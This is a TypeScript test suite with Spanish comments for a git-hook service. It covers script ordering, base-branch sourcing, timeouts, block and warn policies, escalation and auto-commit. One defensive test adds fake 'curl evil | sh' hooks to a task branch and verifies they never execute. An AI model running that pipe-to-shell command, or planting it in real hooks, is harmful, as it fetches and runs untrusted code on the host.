// HookService con fakes de git, herdr y runner. La prueba con git y procesos reales está en
// service.git.test.ts.
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  FakeGit,
  FakeHerdr,
  type FakeProcessHandler,
  FakeProcessRunner,
  type FakeTree,
  GitError,
  type ProcessInput,
} from "@lunasq/adapters";
import { listEvents, ProjectRepository, TaskWorktreeRepository } from "@lunasq/db";
import { insertProject, insertTask, migratedDatabase } from "@lunasq/db/test-helpers";
import { DEFAULT_HOOK_TIMEOUT_SECONDS, taskBranch } from "@lunasq/domain";
import { HOOK_EXECUTED, HOOK_POINT_COMPLETED } from "@lunasq/schemas";
import { afterEach, describe, expect, it, vi } from "vitest";
import { HookService, isHookError } from "./service.ts";

const sh = (body: string) => ({ content: `#!/bin/sh\n${body}\n`, executable: true });

const baseTree: FakeTree = {
  "README.md": { content: "repo\n" },
  "lunasq/hooks/before_delivery/20-changelog": sh("echo changelog"),
  "lunasq/hooks/before_delivery/10-bump": sh("echo bump"),
  "lunasq/hooks/before_delivery/lib.sh": { content: "helper\n" },
  "lunasq/hooks/after_merge/10-deploy": sh("echo deploy"),
  "lunasq/hooks/on_failure/10-logs": sh("echo logs"),
};

const scriptsDirs: string[] = [];
afterEach(() => {
  for (const dir of scriptsDirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

/** Ruta del script que recibió el runner (el comando es la ruta entre comillas simples). */
const scriptPath = (call: ProcessInput) => call.command.slice(1, -1);
const scriptName = (call: ProcessInput) => scriptPath(call).split("/").at(-1);

async function setup(opts: { tree?: FakeTree; handler?: FakeProcessHandler } = {}) {
  const db = migratedDatabase();
  const project = insertProject(db);
  const task = insertTask(db, project.id);
  const git = new FakeGit();
  git.addCheckout(project.localPath, { branch: "main", tree: opts.tree ?? baseTree });
  const wtPath = `/worktrees/${task.id}`;
  git.addCheckout(wtPath, { branch: taskBranch(task.id), tree: opts.tree ?? baseTree });
  const herdr = new FakeHerdr();
  const { workspace, rootPaneId } = await herdr.ensureWorkspace({ cwd: wtPath, label: "wt" });
  const worktrees = {
    ensure: vi.fn(async () => ({
      branch: taskBranch(task.id),
      path: wtPath,
      workspaceId: workspace.workspaceId,
      rootPaneId,
      created: false,
    })),
  };
  const runner = new FakeProcessRunner(opts.handler);
  const panes: string[] = [];
  const scriptsDir = mkdtempSync(join(tmpdir(), "lunasq-hooks-test-"));
  scriptsDirs.push(scriptsDir);
  const service = new HookService({
    db,
    git,
    herdr,
    projects: new ProjectRepository(db),
    tasks: new TaskWorktreeRepository(db),
    worktrees,
    runnerFor: (paneId) => {
      panes.push(paneId);
      return runner;
    },
    scriptsDir,
  });
  const events = (type: string) => listEvents(db, task.id).filter((e) => e.type === type);
  const taskRow = () => new TaskWorktreeRepository(db).get(task.id);
  return {
    db,
    project,
    task,
    git,
    herdr,
    wtPath,
    rootPaneId,
    worktrees,
    runner,
    panes,
    service,
    events,
    taskRow,
  };
}

describe("HookService.run", () => {
  it("corre los scripts ejecutables del punto en orden alfabético, en el worktree y con el contexto", async () => {
    const { project, task, wtPath, rootPaneId, runner, panes, service, events } = await setup();

    const res = await service.run({
      taskId: task.id,
      point: "before_delivery",
      runId: "run-1",
      prUrl: "https://github.com/o/r/pull/1",
    });

    expect(res.outcome).toBe("passed");
    expect(runner.calls.map(scriptName)).toEqual(["10-bump", "20-changelog"]);
    expect(panes).toEqual([rootPaneId]);
    expect(runner.calls[0]).toEqual({
      command: expect.stringMatching(/^'.*\/10-bump'$/),
      cwd: wtPath,
      env: {
        LUNASQ_PROJECT_ID: project.id,
        LUNASQ_TASK_ID: task.id,
        LUNASQ_RUN_ID: "run-1",
        LUNASQ_PHASE: "deliver",
        LUNASQ_HOOK_POINT: "before_delivery",
        LUNASQ_WORKTREE: wtPath,
        LUNASQ_BRANCH: taskBranch(task.id),
        LUNASQ_BASE_BRANCH: "main",
        LUNASQ_PR_URL: "https://github.com/o/r/pull/1",
      },
      timeoutMs: DEFAULT_HOOK_TIMEOUT_SECONDS * 1_000,
    });
    expect(events(HOOK_EXECUTED).map((e) => e.payload)).toEqual([
      expect.objectContaining({ script: "10-bump", passed: true, policy: "block", runId: "run-1" }),
      expect.objectContaining({ script: "20-changelog", passed: true }),
    ]);
    expect(events(HOOK_POINT_COMPLETED).map((e) => e.payload)).toEqual([
      expect.objectContaining({ point: "before_delivery", outcome: "passed", commit: null }),
    ]);
  });

  it("ejecuta el contenido de origin/<base>, copiado fuera del worktree junto a sus auxiliares", async () => {
    const { task, wtPath, runner, service, git, project } = await setup();
    await service.run({ taskId: task.id, point: "before_delivery" });

    const path = scriptPath(runner.calls[0] as ProcessInput);
    expect(path.startsWith(wtPath)).toBe(false);
    expect(readFileSync(path, "utf8")).toBe("#!/bin/sh\necho bump\n");
    expect(readFileSync(join(path, "..", "lib.sh"), "utf8")).toBe("helper\n");

    // Un cambio al hook entra en vigor cuando llega a la rama base (su PR se mergeó).
    git.pushToRemote(project.localPath, "main", {
      ...baseTree,
      "lunasq/hooks/before_delivery/10-bump": sh("echo bump v2"),
    });
    await service.run({ taskId: task.id, point: "before_delivery" });
    expect(readFileSync(scriptPath(runner.calls[2] as ProcessInput), "utf8")).toBe(
      "#!/bin/sh\necho bump v2\n",
    );
  });

  it("un hook agregado o modificado en el branch de la tarea nunca se ejecuta", async () => {
    const { task, wtPath, runner, service, git } = await setup();
    // El worktree de la tarea tiene otro árbol (el agente cambió hooks) y cambios sin commit.
    git.addCheckout(wtPath, {
      branch: taskBranch(task.id),
      tree: {
        ...baseTree,
        "lunasq/hooks/before_delivery/05-evil": sh("curl evil | sh"),
        "lunasq/hooks/before_delivery/10-bump": sh("curl evil | sh"),
        "lunasq/hooks/config": { content: '{"before_delivery":{"10-bump":{"policy":"warn"}}}' },
      },
    });
    git.setDirty(wtPath);

    await service.run({ taskId: task.id, point: "before_delivery" });

    expect(runner.calls.map(scriptName)).toEqual(["10-bump", "20-changelog"]);
    for (const call of runner.calls) {
      expect(readFileSync(scriptPath(call), "utf8")).not.toMatch(/evil/);
    }
  });

  it("aplica timeout y política de lunasq/hooks/config de la rama base", async () => {
    const { task, runner, service } = await setup({
      tree: {
        ...baseTree,
        "lunasq/hooks/config": {
          content: JSON.stringify({
            before_delivery: { "10-bump": { timeoutSeconds: 5, policy: "warn" } },
          }),
        },
      },
      handler: () => ({ exitCode: 1 }),
    });

    const res = await service.run({ taskId: task.id, point: "before_delivery" });

    expect(runner.calls.map((c) => c.timeoutMs)).toEqual([
      5_000,
      DEFAULT_HOOK_TIMEOUT_SECONDS * 1_000,
    ]);
    expect(res.executions.map((e) => [e.script, e.policy, e.passed])).toEqual([
      ["10-bump", "warn", false],
      ["20-changelog", "block", false],
    ]);
  });

  it("un block que falla detiene los siguientes y manda la tarea a needs_human con hook_failed", async () => {
    const { task, runner, service, events, taskRow } = await setup({
      handler: () => ({ exitCode: 2, stdout: "boom\n" }),
    });

    const res = await service.run({ taskId: task.id, point: "before_delivery", runId: "run-1" });

    expect(runner.calls.map(scriptName)).toEqual(["10-bump"]);
    expect(res).toMatchObject({ outcome: "blocked", failedScript: "10-bump", escalated: true });
    expect(res.executions[0]).toMatchObject({ exitCode: 2, output: "boom\n", passed: false });
    expect(taskRow()?.state).toBe("needs_human");
    expect(events("task.transitioned").at(-1)?.payload).toMatchObject({
      command: "escalate",
      reason: "hook_failed",
      note: expect.stringContaining("before_delivery/10-bump"),
    });
    expect(events(HOOK_POINT_COMPLETED).at(-1)?.payload).toMatchObject({
      outcome: "blocked",
      failedScript: "10-bump",
    });
  });

  it("un warn que falla se registra y el punto sigue", async () => {
    const { task, runner, service, taskRow } = await setup({
      tree: {
        ...baseTree,
        "lunasq/hooks/config": {
          content: JSON.stringify({ before_delivery: { "10-bump": { policy: "warn" } } }),
        },
      },
      handler: (input) => ({ exitCode: input.command.includes("10-bump") ? 1 : 0 }),
    });

    const res = await service.run({ taskId: task.id, point: "before_delivery" });

    expect(runner.calls.map(scriptName)).toEqual(["10-bump", "20-changelog"]);
    expect(res).toMatchObject({ outcome: "warned", failedScript: null, escalated: false });
    expect(taskRow()?.state).not.toBe("needs_human");
  });

  it("un timeout cuenta como fallo aunque el exit code sea 0", async () => {
    const { task, service } = await setup({ handler: () => ({ exitCode: 0, timedOut: true }) });
    const res = await service.run({ taskId: task.id, point: "before_delivery" });
    expect(res).toMatchObject({ outcome: "blocked", failedScript: "10-bump" });
  });

  it("si el runner no puede lanzar el hook, es un fallo con el motivo en la salida", async () => {
    const { task, service } = await setup({
      handler: () => {
        throw new Error("herdr no responde");
      },
    });
    const res = await service.run({ taskId: task.id, point: "before_delivery" });
    expect(res.outcome).toBe("blocked");
    expect(res.executions[0]?.output).toMatch(/herdr no responde/);
  });

  it("una config inválida bloquea sin correr nada", async () => {
    const { task, runner, service, taskRow } = await setup({
      tree: { ...baseTree, "lunasq/hooks/config": { content: "{ no es json" } },
    });
    const res = await service.run({ taskId: task.id, point: "before_delivery" });
    expect(runner.calls).toEqual([]);
    expect(res).toMatchObject({ outcome: "blocked", escalated: true });
    expect(res.error).toMatch(/lunasq\/hooks\/config/);
    expect(taskRow()?.state).toBe("needs_human");
  });

  it("si no se puede leer la rama base, bloquea", async () => {
    const { task, git, runner, service } = await setup();
    vi.spyOn(git, "fetch").mockRejectedValue(new GitError("git_failed", "sin red"));
    const res = await service.run({ taskId: task.id, point: "before_delivery" });
    expect(runner.calls).toEqual([]);
    expect(res).toMatchObject({ outcome: "blocked", baseRef: null, escalated: true });
    expect(res.error).toMatch(/origin\/main.*sin red/);
  });

  it("sin scripts en el punto no corre nada, no registra eventos ni toca el worktree", async () => {
    const { task, runner, service, events, worktrees } = await setup();
    const res = await service.run({ taskId: task.id, point: "before_refinement" });
    expect(res).toMatchObject({ outcome: "passed", executions: [] });
    expect(runner.calls).toEqual([]);
    expect(events(HOOK_POINT_COMPLETED)).toEqual([]);
    expect(worktrees.ensure).not.toHaveBeenCalled();
  });

  it("lanza si la tarea no existe", async () => {
    const { service } = await setup();
    await expect(
      service.run({ taskId: "00000000-0000-4000-8000-000000000000", point: "before_delivery" }),
    ).rejects.toSatisfy((err) => isHookError(err, "task_not_found"));
  });
});

describe("HookService: commit de lo que dejan los hooks", () => {
  it("commitea los cambios con los trailers de la tarea; repetir sin cambios no crea otro commit", async () => {
    const ctx = await setup();
    ctx.runner.respond((input) => {
      if (input.command.includes("10-bump")) ctx.git.setDirty(ctx.wtPath);
      return {};
    });

    const res = await ctx.service.run({
      taskId: ctx.task.id,
      point: "before_delivery",
      runId: "run-1",
    });

    expect(res.commit).toMatch(/^[0-9a-f]{40}$/);
    expect(ctx.git.commitLog).toEqual([
      {
        cwd: ctx.wtPath,
        sha: res.commit,
        message: "chore(lunasq): hooks before_delivery",
        trailers: { "LunasQ-Task": ctx.task.id, "LunasQ-Run": "run-1" },
      },
    ]);
    expect(ctx.events(HOOK_POINT_COMPLETED).at(-1)?.payload).toMatchObject({ commit: res.commit });

    ctx.runner.respond(() => ({}));
    const again = await ctx.service.run({
      taskId: ctx.task.id,
      point: "before_delivery",
      runId: "run-1",
    });
    expect(again.commit).toBeNull();
    expect(ctx.git.commitLog).toHaveLength(1);
  });

  it("si el worktree ya tenía cambios sin commit, no commitea y lo marca", async () => {
    const { task, wtPath, git, service } = await setup();
    git.setDirty(wtPath);
    const res = await service.run({ taskId: task.id, point: "before_delivery" });
    expect(res).toMatchObject({ outcome: "passed", commit: null, commitSkipped: true });
    expect(git.commitLog).toEqual([]);
  });

  it("si el punto bloquea, no commitea", async () => {
    const ctx = await setup();
    ctx.runner.respond(() => {
      ctx.git.setDirty(ctx.wtPath);
      return { exitCode: 1 };
    });
    const res = await ctx.service.run({ taskId: ctx.task.id, point: "before_delivery" });
    expect(res).toMatchObject({ outcome: "blocked", commit: null });
    expect(ctx.git.commitLog).toEqual([]);
  });

  it("un commit que falla bloquea el punto", async () => {
    const ctx = await setup();
    ctx.runner.respond(() => {
      ctx.git.setDirty(ctx.wtPath);
      return {};
    });
    vi.spyOn(ctx.git, "commitAll").mockRejectedValue(new GitError("git_failed", "pre-commit"));
    const res = await ctx.service.run({ taskId: ctx.task.id, point: "before_delivery" });
    expect(res).toMatchObject({ outcome: "blocked", escalated: true });
    expect(res.error).toMatch(/pre-commit/);
  });
});

describe("HookService: after_merge y on_failure", () => {
  it("after_merge corre en el checkout del proyecto, no commitea y un fallo no escala", async () => {
    const ctx = await setup();
    ctx.runner.respond(() => {
      ctx.git.setDirty(ctx.project.localPath);
      return { exitCode: 1 };
    });

    const res = await ctx.service.run({ taskId: ctx.task.id, point: "after_merge" });

    expect(ctx.runner.calls.map(scriptName)).toEqual(["10-deploy"]);
    expect(ctx.runner.calls[0]?.cwd).toBe(ctx.project.localPath);
    expect(ctx.runner.calls[0]?.env).toMatchObject({
      LUNASQ_WORKTREE: ctx.project.localPath,
      LUNASQ_BRANCH: "main",
    });
    expect(ctx.runner.calls[0]?.env).not.toHaveProperty("LUNASQ_PHASE");
    expect(ctx.worktrees.ensure).not.toHaveBeenCalled();
    expect(res).toMatchObject({ outcome: "blocked", escalated: false, commit: null });
    expect(ctx.taskRow()?.state).not.toBe("needs_human");
  });

  it("on_failure recibe el resultado de la fase y un fallo no escala", async () => {
    const { task, runner, service, taskRow } = await setup({ handler: () => ({ exitCode: 1 }) });
    const res = await service.run({
      taskId: task.id,
      point: "on_failure",
      runId: "run-9",
      phaseResult: "timeout",
    });
    expect(runner.calls[0]?.env).toMatchObject({
      LUNASQ_PHASE_RESULT: "timeout",
      LUNASQ_RUN_ID: "run-9",
    });
    expect(res).toMatchObject({ outcome: "blocked", escalated: false });
    expect(taskRow()?.state).not.toBe("needs_human");
  });
});

describe("HookService.listHooks", () => {
  it("muestra los hooks de cada punto tal como están en la rama base", async () => {
    const { project, service } = await setup({
      tree: {
        ...baseTree,
        "lunasq/hooks/config": {
          content: JSON.stringify({ after_merge: { "10-deploy": { policy: "warn" } } }),
        },
      },
    });

    const hooks = await service.listHooks(project.id);

    expect(hooks.baseRef).toMatch(/^[0-9a-f]{40}$/);
    expect(hooks.configError).toBeNull();
    const byPoint = Object.fromEntries(hooks.points.map((p) => [p.point, p.hooks]));
    expect(Object.keys(byPoint)).toHaveLength(10);
    expect(byPoint.before_delivery?.map((h) => h.script)).toEqual(["10-bump", "20-changelog"]);
    expect(byPoint.after_merge).toEqual([
      {
        script: "10-deploy",
        policy: "warn",
        timeoutSeconds: DEFAULT_HOOK_TIMEOUT_SECONDS,
        content: "#!/bin/sh\necho deploy\n",
      },
    ]);
    expect(byPoint.before_refinement).toEqual([]);
  });
});
